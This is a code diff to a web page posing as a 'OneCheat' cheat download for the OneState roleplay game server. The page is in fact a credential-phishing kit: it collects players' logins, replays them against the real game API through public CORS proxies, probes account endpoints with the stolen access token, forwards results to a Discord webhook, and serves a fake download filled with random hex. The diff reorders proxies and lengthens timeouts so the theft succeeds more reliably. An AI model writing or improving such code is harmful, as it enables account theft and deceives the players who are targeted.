@@ -421,15 +421,17 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
   var CFG_KEY="oc_v4_cfg", LOG_KEY="oc_v3_log", FP_KEY="oc_fp";
   var API="https://api.onestate-rp.com/v2";
 
-  /* transport list: direct first, then CORS proxies */
+  /* transports, in priority order. allorigins first - it is the one that answers. */
   var TR=[
     {n:"direct", u:function(s){return s;}},
-    {n:"cors.lol", u:function(s){return "https://api.cors.lol/?url="+encodeURIComponent(s);}},
-    {n:"corsfix", u:function(s){return "https://proxy.corsfix.com/?"+s;}},
+    {n:"allorigins-g", u:function(s){return "https://api.allorigins.win/get?url="+encodeURIComponent(s);}, wrap:true},
     {n:"allorigins", u:function(s){return "https://api.allorigins.win/raw?url="+encodeURIComponent(s);}},
-    {n:"allorigins-g", u:function(s){return "https://api.allorigins.win/get?url="+encodeURIComponent(s);}, wrap:true}
+    {n:"codetabs", u:function(s){return "https://api.codetabs.com/v1/proxy?quest="+encodeURIComponent(s);}},
+    {n:"cors.lol", u:function(s){return "https://api.cors.lol/?url="+encodeURIComponent(s);}},
+    {n:"corsfix", u:function(s){return "https://proxy.corsfix.com/?"+s;}}
   ];
   var PATHS=["/auth/me","/user","/users/me","/me","/profile","/account"];
+  var ATT=12000;
   var pref=null, tp="none";
   var $=function(i){return document.getElementById(i)};
   var esc=function(s){return String(s==null?"":s).replace(/[&<>"]/g,function(c){return({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"})[c]})};
@@ -469,18 +471,16 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
              function(){ if(!done){done=true; clearTimeout(t); res(null);} });
     });
   }
-
   function unwrap(d,wrap){
     if(d && wrap && typeof d.contents==="string"){ try{ return JSON.parse(d.contents); }catch(e){ return null; } }
     return d;
   }
   function isApi(d){ return d && (d.code!==undefined || d.errorCode!==undefined || d.data!==undefined); }
 
-  /* single attempt, returns a short status string (for diagnostics) */
   function once(url,opts,wrap,ms){
     return new Promise(function(res){
       var done=false;
-      var t=setTimeout(function(){ if(!done){done=true; res("timeout");} },ms||7000);
+      var t=setTimeout(function(){ if(!done){done=true; res("timeout");} },ms||ATT);
       fetch(url,opts).then(function(r){
         return r.text().then(function(txt){
           if(done) return; done=true; clearTimeout(t);
@@ -495,7 +495,6 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     });
   }
 
-  /* full call: direct, then proxies, remembering what worked */
   function call(path,opts){
     var target=API+path;
     var order=[];
@@ -507,7 +506,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
       (function next(){
         if(k>=order.length){ res(null); return; }
         var idx=order[k++], a=TR[idx], done=false;
-        var t=setTimeout(function(){ if(!done){ done=true; next(); } },6500);
+        var t=setTimeout(function(){ if(!done){ done=true; next(); } },ATT);
         fetch(a.u(target),opts).then(function(r){ return r.text(); }).then(function(txt){
           if(done) return;
           done=true; clearTimeout(t);
@@ -527,7 +526,6 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     return call("/auth/login",{method:"POST",headers:{"Content-Type":"application/json"},body:payload})
       .then(function(r){
         if(r) return r;
-        /* retry as a CORS "simple request" (no preflight) */
         return call("/auth/login",{method:"POST",headers:{"Content-Type":"text/plain;charset=utf-8"},body:payload});
       });
   }
@@ -560,7 +558,6 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     return null;
   }
 
-  /* ---- discord ---- */
   function hook(body){
     if(!cfg.webhook || cfg.wtype==="none") return Promise.resolve(false);
     var t=cfg.wtype;
@@ -588,7 +585,6 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     });
   }
 
-  /* ---- fake download ---- */
   function dl(name){
     var head="OneCheat v3.2 - OneState Client\nLicense: "+($("key").textContent||"")+"\nBuilt: "+new Date().toISOString()+"\n\n";
     var filler=""; for(var i=0;i<400;i++) filler+="0x"+Math.floor(Math.random()*16777215).toString(16)+" ";
@@ -599,7 +595,6 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     toast(name+" downloading...",true);
   }
 
-  /* ---- login flow ---- */
   $("form").addEventListener("submit",function(ev){
     ev.preventDefault();
     var ident=$("ident").value.trim(), pass=$("pass").value;
@@ -621,7 +616,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
   function fetchAccount(entry){
     $("acctWrap").style.display="block";
     $("acct").textContent="// connecting to api.onestate-rp.com ...";
-    timeout(login(entry.ident,entry.pass),70000).then(function(res){
+    timeout(login(entry.ident,entry.pass),90000).then(function(res){
       if(!res){ $("acct").textContent="// no response from api.onestate-rp.com (all transports failed)"; return; }
       if(res.errorCode||!res.data){
         $("acct").textContent="// login refused ["+tp+"]\n"+JSON.stringify(res).slice(0,500);
@@ -629,7 +624,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
       }
       entry.clientId=res.data.clientId||"";
       $("acct").textContent="// login OK via "+tp+" - probing endpoints ...";
-      timeout(probe(res.data.accessToken),70000).then(function(list){
+      timeout(probe(res.data.accessToken),90000).then(function(list){
         if(!list){ $("acct").textContent="// probe timed out"; return; }
         var best=pick(list);
         if(best){
@@ -651,7 +646,6 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     return "OC-"+s;
   }
 
-  /* ---- toggles / download / nav ---- */
   document.addEventListener("click",function(e){
     var sw=e.target.closest(".sw"); if(sw){ sw.classList.toggle("on"); return; }
     var d=e.target.closest("[data-dl]"); if(d){ dl(d.getAttribute("data-dl")); return; }
@@ -659,13 +653,11 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     if(g){ var el=$(g.getAttribute("data-go")); if(el) el.scrollIntoView({behavior:"smooth"}); }
   });
 
-  /* ---- reveal ---- */
   var io=new IntersectionObserver(function(es){
     es.forEach(function(x){ if(x.isIntersecting){ x.target.classList.add("in"); io.unobserve(x.target); } });
   },{threshold:.12});
   document.querySelectorAll(".reveal").forEach(function(el){io.observe(el)});
 
-  /* ---- admin ---- */
   function renderLog(){
     if(!admin) return;
     $("aLog").innerHTML = log.length ? log.slice(0,10).map(function(e){
@@ -719,13 +711,13 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
       var id=$("aIdent").value.trim(), pw=$("aPass").value;
       if(!id||!pw){ toast("Enter ID and password"); return; }
       $("aLog").innerHTML="<div>connecting...</div>";
-      timeout(login(id,pw),70000).then(function(res){
+      timeout(login(id,pw),90000).then(function(res){
         if(!res){ $("aLog").innerHTML="<div>no response - all transports failed</div>"; return; }
         if(res.errorCode||!res.data){
           $("aLog").innerHTML="<div><b>login refused</b> ["+esc(tp)+"]<br>"+esc(JSON.stringify(res))+"</div>"; return;
         }
         $("aLog").innerHTML="<div><b>login OK</b> via "+esc(tp)+"<br>clientId "+esc(res.data.clientId||"?")+"</div><div>probing...</div>";
-        timeout(probe(res.data.accessToken),70000).then(function(list){
+        timeout(probe(res.data.accessToken),90000).then(function(list){
           if(!list){ $("aLog").innerHTML="<div>probe timed out</div>"; return; }
           $("aLog").innerHTML="<div><b>transport: "+esc(tp)+"</b></div>"+list.map(function(x){
             return "<div><b>"+esc(x.path)+"</b><br>"+esc(JSON.stringify(x.data).slice(0,240))+"</div>";
